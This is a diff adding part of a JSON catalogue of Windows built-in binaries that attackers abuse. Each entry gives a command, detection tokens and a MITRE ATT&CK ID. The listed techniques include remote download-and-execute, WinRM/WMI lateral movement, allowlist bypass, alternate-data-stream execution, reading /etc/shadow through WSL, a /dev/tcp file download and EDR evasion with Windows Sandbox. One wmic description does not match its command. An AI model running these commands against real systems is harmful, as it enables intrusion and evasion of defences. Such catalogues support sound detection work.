+        ],
+        "category": "Execute",
+        "usecase": "Download and execute an arbitrary file from the internet",
+        "description": "Downloads a file from the web address specified in .yml file and executes it on the system. Local manifest setting must be enabled in winget for it to work: `winget settings --enable LocalManifestFiles`",
+        "mitre": "T1105"
+      },
+      {
+        "command": "winget.exe install --accept-package-agreements -s msstore {name or ID}",
+        "skeleton": [
+          "install",
+          "--accept-package-agreements",
+          "msstore"
+        ],
+        "category": "Download",
+        "usecase": "Download and install software from Microsoft Store, even if Microsoft Store App is blocked",
+        "description": "Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine. For example, use \"Sysinternals Suite\" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this.",
+        "mitre": "T1105"
+      }
+    ],
+    "winrm.vbs": [
+      {
+        "command": "winrm invoke Create wmicimv2/Win32_Process @{CommandLine=\"{CMD}\"} -r:http://target:5985",
+        "skeleton": [
+          "invoke",
+          "create"
+        ],
+        "category": "Execute",
+        "usecase": "Proxy execution",
+        "description": "Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol",
+        "mitre": "T1216"
+      },
+      {
+        "command": "winrm invoke Create wmicimv2/Win32_Service @{Name=\"Evil\";DisplayName=\"Evil\";PathName=\"{CMD}\"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985",
+        "skeleton": [
+          "invoke",
+          "create",
+          "startservice"
+        ],
+        "category": "Execute",
+        "usecase": "Proxy execution",
+        "description": "Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol",
+        "mitre": "T1216"
+      },
+      {
+        "command": "%SystemDrive%\\BypassDir\\cscript //nologo %windir%\\System32\\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty",
+        "skeleton": [
+          "//nologo",
+          "-format:"
+        ],
+        "category": "AWL Bypass",
+        "usecase": "Execute arbitrary, unsigned code via XSL script",
+        "description": "Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious WsmPty.xsl in the same location, and executing winrm.vbs via the relocated cscript.exe.",
+        "mitre": "T1220"
+      }
+    ],
+    "wmic.exe": [
+      {
+        "command": "wmic.exe process call create \"{PATH_ABSOLUTE}:program.exe\"",
+        "skeleton": [
+          "process",
+          "call",
+          "create"
+        ],
+        "category": "ADS",
+        "usecase": "Execute binary file hidden in Alternate data streams to evade defensive counter measures",
+        "description": "Execute a .EXE file stored as an Alternate Data Stream (ADS)",
+        "mitre": "T1564.004"
+      },
+      {
+        "command": "wmic.exe /node:\"192.168.0.1\" process call create \"{CMD}\"",
+        "skeleton": [
+          "/node:",
+          "process",
+          "call",
+          "create"
+        ],
+        "category": "Execute",
+        "usecase": "Execute binary on a remote system",
+        "description": "Execute evil.exe on the remote system.",
+        "mitre": "T1218"
+      },
+      {
+        "command": "wmic.exe process get brief /format:\"{REMOTEURL:.xsl}\"",
+        "skeleton": [
+          "process",
+          "brief",
+          "/format:"
+        ],
+        "category": "Execute",
+        "usecase": "Execute binary on remote system",
+        "description": "Create a volume shadow copy of NTDS.dit that can be copied.",
+        "mitre": "T1218"
+      },
+      {
+        "command": "wmic.exe datafile where \"Name='C:\\\\windows\\\\system32\\\\calc.exe'\" call Copy \"C:\\\\users\\\\public\\\\calc.exe\"",
+        "skeleton": [
+          "datafile",
+          "where",
+          "call",
+          "copy"
+        ],
+        "category": "Copy",
+        "usecase": "Copy file.",
+        "description": "Copy file from source to destination.",
+        "mitre": "T1105"
+      },
+      {
+        "command": "WMIC.exe /Namespace:\\\\\\\\root\\\\SecurityCenter2 Path AntiVirusProduct Get displayName,productState",
+        "skeleton": [
+          "path",
+          "antivirusproduct"
+        ],
+        "category": "Execute",
+        "usecase": "Recon",
+        "description": "Executes WMIC to gather the existing Antivirus or EDR solution installed on the machine.",
+        "mitre": "T1518.001"
+      }
+    ],
+    "wsb.exe": [
+      {
+        "command": "wsb start --config \"<Configuration><LogonCommand><Command>{CMD}</Command></LogonCommand></Configuration>\"\nwsb exec -r System --id YOUR_ID",
+        "skeleton": [
+          "start",
+          "--config",
+          "exec",
+          "system",
+          "--id"
+        ],
+        "category": "Execute",
+        "usecase": "Fileless execution of arbitrary commands in an EDR-free environment whose host-side process tree is masked by the Sandbox client binaries.",
+        "description": "Executes the given command in a Windows Sandbox from an inline XML configuration with an embedded `<LogonCommand>`, leaving no `.wsb` file on disk. Note: `<LogonCommand>` only fires once `WDAGUtilityAccount` actually logs in, which only happens after an RDP session is established via `wsb connect`, so this pattern opens a visible Sandbox window.",
+        "mitre": "T1564.006"
+      },
+      {
+        "command": "wsb start --config \"<Configuration><MappedFolders><MappedFolder><HostFolder>{PATH_ABSOLUTE:folder}</HostFolder><ReadOnly>false</ReadOnly></MappedFolder></MappedFolders></Configuration>\"\nwsb exec -r System --id YOUR_ID -c \"cmd.exe /c copy C:\\users\\WDAGUtilityAccount\\Desktop\\Temp\\{PATH} {PATH}\"",
+        "skeleton": [
+          "start",
+          "--config",
+          "exec",
+          "system",
+          "--id",
+          "copy"
+        ],
+        "category": "Execute",
+        "usecase": "Fileless execution of arbitrary commands in an EDR-free environment, with access to files on the host system, while the host-side process tree is masked by the Sandbox client binaries.",
+        "description": "Allows the specified folder to be accessible from within the Windows Sandbox, mounted under `C:\\users\\WDAGUtilityAccount\\Desktop` with the same folder name as the source folder. This allows, for example, for copying payloads from the host system into the sandbox (seen here), copying payloads from the sandbox back to the host system, or for accessing arbitrary host system files by the sandbox.",
+        "mitre": "T1564.006"
+      },
+      {
+        "command": "wsb start\nwsb share --id YOUR_ID -f {PATH_ABSOLUTE:folder} -s c:\\SOME_FOLDER --allow-write\nwsb exec -r System --id YOUR_ID -c \"cmd.exe /c copy {PATH_ABSOLUTE} c:\\SOME_FOLDER\"",
+        "skeleton": [
+          "start",
+          "share",
+          "--id",
+          "--allow-write",
+          "exec",
+          "system",
+          "copy"
+        ],
+        "category": "Execute",
+        "usecase": "Fileless execution of arbitrary commands in an EDR-free environment, with access to files on the host system, while the host-side process tree is masked by the Sandbox client binaries.",
+        "description": "Allows the specified folder to be accessible from within the Windows Sandbox, mounted at `c:\\SOME_FOLDER`. This allows, for example, for copying payloads from the host system into the sandbox, copying payloads from the sandbox back to the host system (seen here), or for accessing arbitrary host system files by the sandbox.",
+        "mitre": "T1564.006"
+      }
+    ],
+    "wscript.exe": [
+      {
+        "command": "wscript //e:vbscript {PATH}:script.vbs",
+        "skeleton": [
+          "//e:"
+        ],
+        "category": "ADS",
+        "usecase": "Execute hidden code to evade defensive counter measures",
+        "description": "Execute script stored in an alternate data stream",
+        "mitre": "T1564.004"
+      }
+    ],
+    "wsl.exe": [
+      {
+        "command": "wsl.exe -u root -e cat /etc/shadow",
+        "skeleton": [
+          "root",
+          "/etc/shadow"
+        ],
+        "category": "Execute",
+        "usecase": "Performs execution of arbitrary Linux commands as root without need for password.",
+        "description": "Cats /etc/shadow file as root",
+        "mitre": "T1202"
+      },
+      {
+        "command": "wsl.exe --exec bash -c \"{CMD}\"",
+        "skeleton": [
+          "--exec",
+          "bash"
+        ],
+        "category": "Execute",
+        "usecase": "Performs execution of arbitrary Linux commands.",
+        "description": "Executes Linux command (for example via bash) as the default user (unless stated otherwise using `-u <username>`) on the default WSL distro (unless stated otherwise using `-d <distro name>`)",
+        "mitre": "T1202"
+      },
+      {
+        "command": "wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'",
+        "skeleton": [
+          "--exec",
+          "bash",
+          "/dev/tcp/192.168.1.10/54",
+          "binary"
+        ],
+        "category": "Download",
+        "usecase": "Download file",
+        "description": "Downloads file from 192.168.1.10",
+        "mitre": "T1105"
+      }
+    ],
+    "wuauclt.exe": [
+      {
+        "command": "wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} /RunHandlerComServer",
+        "skeleton": [
+          "/updatedeploymentprovider",
+          "/runhandlercomserver"
+        ],
+        "category": "Execute",
+        "usecase": "Execute dll via attach/detach methods",
+        "description": "Loads and executes DLL code on attach.",
+        "mitre": "T1218"
+      }
+    ],
+    "xbootmgr.exe": [
+      {
+        "command": "xbootmgr.exe -trace \"{boot|hibernate|standby|shutdown|rebootCycle}\" -callBack {PATH:.exe}",
+        "skeleton": [
+          "-trace",
+          "-callback"
+        ],
+        "category": "Execute",
+        "usecase": "Executes code as part of post-trace automation flow.",
+        "description": "Executes an executable after the trace is complete using the callBack parameter.",
+        "mitre": "T1202"
+      },
+      {
+        "command": "xbootmgr.exe -trace \"{boot|hibernate|standby|shutdown|rebootCycle}\" -preTraceCmd {PATH:.exe}",
+        "skeleton": [
+          "-trace",
+          "-pretracecmd"
+        ],
+        "category": "Execute",
+        "usecase": "Executes code as part of pre-trace automation or staging.",
+        "description": "Executes an executable before each trace run using the preTraceCmd parameter.",
+        "mitre": "T1202"
+      }
+    ],
+    "xwizard.exe": [
+      {
+        "command": "xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}",
+        "skeleton": [
+          "runwizard",
+          "/taero"
+        ],
+        "category": "Execute",
+        "usecase": "Run a com object created in registry to evade defensive counter measures",
+        "description": "Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds.",
+        "mitre": "T1218"
+      }
+    ]
+  }
+}
